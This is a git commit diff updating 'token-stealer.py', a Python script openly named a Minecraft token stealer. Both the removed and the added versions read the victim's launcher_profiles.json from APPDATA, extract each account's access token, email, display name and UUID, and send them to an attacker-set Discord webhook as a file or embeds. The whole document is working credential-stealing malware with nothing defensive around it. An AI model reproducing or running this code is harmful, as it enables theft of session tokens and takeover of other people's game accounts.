1d8cdbcac0f2a9fb4bb898f7ee6ed08f956ce0ce
WodX <wodx@outlook.dk>
2019-10-25 00:10:44 +0200

    Update token-stealer.py

--- token-stealer.py
+++ token-stealer.py
@@ -5,7 +5,6 @@
 
 import discord_webhook
 import json
-import io
 import os
 
 # configuration
@@ -14,42 +13,29 @@ WEBHOOK_URL = '<URL HERE>'
 def uuid_dashed(uuid):
     return f'{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}'
 
-def main():
-    path = os.getenv('APPDATA') + '\\.minecraft\\launcher_profiles.json'
+if __name__ == '__main__':
+    auth_db = json.loads(open(os.getenv('APPDATA') + '\\.minecraft\\launcher_profiles.json').read())['authenticationDatabase']
 
-    json_data = json.loads(open(path).read())
-    auth_db = json_data['authenticationDatabase']
-
-    profiles = []
-    for x in auth_db:
-        session_token = auth_db[x]['accessToken']
-        login_name = auth_db[x].get('username')
+    webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL, username='Minecraft Token Stealer', avatar_url='http://www.rw-designer.com/icon-image/5547-256x256x32.png')
+    
+    for i, x in enumerate(auth_db):
+        token = auth_db[x]['accessToken']
+        email = auth_db[x].get('username')
         uuid, display_name_object = list(auth_db[x]['profiles'].items())[0]
 
-        profile = {
-            'username': display_name_object['displayName'],
-            'uuidv4': uuid,
-            'uuidv4-dashed': uuid_dashed(uuid),
-            'token': session_token,
-            'login-name': login_name
-        }
+        embed = discord_webhook.DiscordEmbed(color=0xFFFFFF)
+        
+        if i == 0:
+            embed.set_author(name='Download on GitHub', url='https://github.com/WodxTV/Minecraft-Session-Token-Stealer', icon_url='https://github.com/fluidicon.png')
+        elif i == len(auth_db) - 1:
+            embed.set_footer(text='Developed by WodX')
 
-        profiles.append(profile)
+        embed.add_embed_field(name='Email', value=email if email and '@' in email else 'N/A', inline=False)
 
-    data = b''
-    for i, profile in enumerate(profiles):
-        for key, value in profile.items():
-            if not value:
-                continue
+        embed.add_embed_field(name='Username', value=display_name_object['displayName'])
+        embed.add_embed_field(name='UUID', value=uuid_dashed(uuid))
+        embed.add_embed_field(name='Token', value=token)
 
-            data += f'{key}: {value}\n'.encode()
+        webhook.add_embed(embed)
 
-        if i < len(profiles) - 1:
-            data += b'\n'
-    
-    webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL, username='Minecraft Token Stealer by WodX', avatar_url='http://www.rw-designer.com/icon-image/5547-256x256x32.png')
-    webhook.add_file(file=io.BytesIO(data), filename='dump.txt')
     webhook.execute()
-
-if __name__ == '__main__':
-    main()
